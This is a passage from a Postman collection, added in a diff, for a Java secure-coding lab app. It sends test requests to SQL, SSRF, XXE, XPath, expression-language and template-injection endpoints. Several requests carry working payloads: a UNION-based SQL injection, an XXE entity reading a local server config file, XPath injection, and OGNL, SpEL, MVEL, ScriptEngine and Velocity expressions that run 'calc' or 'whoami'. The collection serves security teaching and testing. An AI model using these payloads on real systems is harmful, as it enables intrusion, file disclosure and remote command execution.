@@ -1,0 +1,1530 @@
+{
+	"info": {
+		"_postman_id": "f2a21800-535d-4f1b-a79d-6606c9d0be80",
+		"name": "JavaWeb-Secure-Coding",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "21653536"
+	},
+	"item": [
+		{
+			"name": "SQL",
+			"item": [
+				{
+					"name": "MyBatis",
+					"item": [
+						{
+							"name": "mybatisStringQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisStringQuery.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisStringQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisStringInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisStringInjection.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisStringInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisLikeQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisLikeQuery.do?username=a",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisLikeQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "a"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisLikeInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisLikeInjection.do?username=a",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisLikeInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "a"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisWhereInQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisWhereInQuery.do?ids=1,2",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisWhereInQuery.do"
+									],
+									"query": [
+										{
+											"key": "ids",
+											"value": "1,2"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisWhereInInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisWhereInInjection.do?ids=1,2",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisWhereInInjection.do"
+									],
+									"query": [
+										{
+											"key": "ids",
+											"value": "1,2"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisOrderByQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisOrderByQuery.do?order=id&orderType=desc",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisOrderByQuery.do"
+									],
+									"query": [
+										{
+											"key": "order",
+											"value": "id"
+										},
+										{
+											"key": "orderType",
+											"value": "desc"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "mybatisOrderByInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Mybatis/mybatisOrderByInjection.do?order=id&orderType=desc",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Mybatis",
+										"mybatisOrderByInjection.do"
+									],
+									"query": [
+										{
+											"key": "order",
+											"value": "id"
+										},
+										{
+											"key": "orderType",
+											"value": "desc"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Spring",
+					"item": [
+						{
+							"name": "jdbcTemplateSQLInjectionTest",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateStringInjection.do?username=admin' and 1=2 union select 1,2,sqlite_version(),4,5,6,'7",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateStringInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin' and 1=2 union select 1,2,sqlite_version(),4,5,6,'7"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateStringInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateStringInjection.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateStringInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateStringQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateStringQuery.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateStringQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateLikeQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateLikeQuery.do?username=a",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateLikeQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "a"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateLikeInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateLikeInjection.do?username=a",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateLikeInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "a"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateOrderByQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateOrderByQuery.do?order=id&orderType=desc",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateOrderByQuery.do"
+									],
+									"query": [
+										{
+											"key": "order",
+											"value": "id"
+										},
+										{
+											"key": "orderType",
+											"value": "desc"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateOrderByInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateOrderByInjection.do?order=id&orderType=desc",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateOrderByInjection.do"
+									],
+									"query": [
+										{
+											"key": "order",
+											"value": "id"
+										},
+										{
+											"key": "orderType",
+											"value": "desc"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateOrderByAppendQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateOrderByAppendQuery.do?order=id&orderType=desc",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateOrderByAppendQuery.do"
+									],
+									"query": [
+										{
+											"key": "order",
+											"value": "id"
+										},
+										{
+											"key": "orderType",
+											"value": "desc"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateWhereInQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateWhereInQuery.do?ids=1",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateWhereInQuery.do"
+									],
+									"query": [
+										{
+											"key": "ids",
+											"value": "1"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jdbcTemplateWhereInInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/Spring/jdbcTemplateWhereInInjection.do?ids=1",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"Spring",
+										"jdbcTemplateWhereInInjection.do"
+									],
+									"query": [
+										{
+											"key": "ids",
+											"value": "1"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "JDBC",
+					"item": [
+						{
+							"name": "findById",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/JDBC/findById.do?id=1",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"JDBC",
+										"findById.do"
+									],
+									"query": [
+										{
+											"key": "id",
+											"value": "1"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "findSysUserById",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/JDBC/findSysUserById.do?id=1",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"JDBC",
+										"findSysUserById.do"
+									],
+									"query": [
+										{
+											"key": "id",
+											"value": "1"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "JPA",
+					"item": [
+						{
+							"name": "jpaWhereInQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpaWhereInQuery.do?users=root&users=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpaWhereInQuery.do"
+									],
+									"query": [
+										{
+											"key": "users",
+											"value": "root"
+										},
+										{
+											"key": "users",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpaLikeQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpaLikeQuery.do?username=root",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpaLikeQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "root"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpaLikeAndOrderByQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpaLikeAndOrderByQuery.do?username=a",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpaLikeAndOrderByQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "a"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpaUsernameBindTest",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpaUsernameBindTest.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpaUsernameBindTest.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpaEmailBindTest",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpaEmailBindTest.do?username=admin@baidu.com",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpaEmailBindTest.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin@baidu.com"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpaIdBindTest",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpaIdBindTest.do?id=1",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpaIdBindTest.do"
+									],
+									"query": [
+										{
+											"key": "id",
+											"value": "1"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpqlQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpqlQuery.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpqlQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "jpqlInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/jpqlInjection.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"jpqlInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "nativeQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/nativeQuery.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"nativeQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "nativeInjection",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/nativeInjection.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"nativeInjection.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "namedQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/namedQuery.do?username=admin",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"namedQuery.do"
+									],
+									"query": [
+										{
+											"key": "username",
+											"value": "admin"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "criteriaQuery",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://{{base_url}}/SQL/JPA/criteriaQuery.do?email=admin@baidu.com",
+									"protocol": "http",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"SQL",
+										"JPA",
+										"criteriaQuery.do"
+									],
+									"query": [
+										{
+											"key": "email",
+											"value": "admin@baidu.com"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "SSRF",
+			"item": [
+				{
+					"name": "urlConnection",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/SSRF/urlConnection.do?url=https://www.baidu.com",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"SSRF",
+								"urlConnection.do"
+							],
+							"query": [
+								{
+									"key": "url",
+									"value": "https://www.baidu.com"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "urlFilterConnection",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/SSRF/urlFilterConnection.do?url=https://www.baidu.com",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"SSRF",
+								"urlFilterConnection.do"
+							],
+							"query": [
+								{
+									"key": "url",
+									"value": "https://www.baidu.com"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "XXE",
+			"item": [
+				{
+					"name": "dom4jSAXReaderXXE",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/dom4jSAXReaderXXE.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"dom4jSAXReaderXXE.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "dom4jSAXReader",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/dom4jSAXReader.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"dom4jSAXReader.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "jaxpSAXParserFactoryXXE",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/jaxpSAXParserFactoryXXE.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"jaxpSAXParserFactoryXXE.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "jaxpSAXParserFactory",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/jaxpSAXParserFactory.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"jaxpSAXParserFactory.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "saxBuilderXXE",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/saxBuilderXXE.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"saxBuilderXXE.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "saxBuilder",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/saxBuilder.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"saxBuilder.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "xmlReaderXXE",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/xmlReaderXXE.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"xmlReaderXXE.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "documentBuilderFactoryXXE",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/documentBuilderFactoryXXE.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"documentBuilderFactoryXXE.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "documentBuilderFactory",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<!DOCTYPE test [\r\n    <!ELEMENT test ANY >\r\n    <!ENTITY start \"<![CDATA[\">\r\n    <!ENTITY end \"]]\">\r\n    <!ENTITY content SYSTEM 'file:///D:\\Documents\\Servers\\apache-tomcat-8.5.83\\conf\\catalina.properties.../\\\\./#^' >\r\n    <!ENTITY end \"]]\">\r\n]>\r\n<article>\r\n    <title>&content;&end;</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/documentBuilderFactory.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"documentBuilderFactory.do"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "jaxbContext",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<article>\r\n    <title>1</title>\r\n</article>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://{{base_url}}/XXE/jaxbContext.do",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XXE",
+								"jaxbContext.do"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "XPath",
+			"item": [
+				{
+					"name": "xpathInjection",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/XPath/xpathInjection.do?username=admin' or '",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XPath",
+								"xpathInjection.do"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "admin' or '"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "xpathQuery",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/XPath/xpathQuery.do?username=admin&password=admin123",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"XPath",
+								"xpathQuery.do"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "admin"
+								},
+								{
+									"key": "password",
+									"value": "admin123"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Expression",
+			"item": [
+				{
+					"name": "Ognl",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/Expression/ognl.do?exp=@java.lang.Runtime@getRuntime().exec('calc')",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"Expression",
+								"ognl.do"
+							],
+							"query": [
+								{
+									"key": "exp",
+									"value": "@java.lang.Runtime@getRuntime().exec('calc')"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "SpEL",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/Expression/spEL.do?exp=new java.lang.ProcessBuilder('calc').start()",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"Expression",
+								"spEL.do"
+							],
+							"query": [
+								{
+									"key": "exp",
+									"value": "new java.lang.ProcessBuilder('calc').start()"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "MVEL2",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/Expression/mvel.do?exp=new java.lang.String(new java.lang.ProcessBuilder('whoami').start().getInputStream().readAllBytes())",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"Expression",
+								"mvel.do"
+							],
+							"query": [
+								{
+									"key": "exp",
+									"value": "new java.lang.String(new java.lang.ProcessBuilder('whoami').start().getInputStream().readAllBytes())"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "ScriptEngine",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/Expression/scriptEngine.do?exp=new java.lang.String(new java.lang.ProcessBuilder('whoami').start().getInputStream().readAllBytes())",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"Expression",
+								"scriptEngine.do"
+							],
+							"query": [
+								{
+									"key": "exp",
+									"value": "new java.lang.String(new java.lang.ProcessBuilder('whoami').start().getInputStream().readAllBytes())"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "SSTI",
+			"item": [
+				{
+					"name": "Velocity",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/SSTI/velocity.do?tpl=%23set($e='e')%23set($c=$e.getClass().forName('org.apache.commons.io.IOUtils'))$c.getMethod('toString',$e.getClass().forName('java.io.InputStream')).invoke(null, $e.getClass().forName('java.lang.Runtime').getMethod('exec', $e.getClass().forName('java.lang.String')).invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'whoami').getInputStream())",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"SSTI",
+								"velocity.do"
+							],
+							"query": [
+								{
+									"key": "tpl",
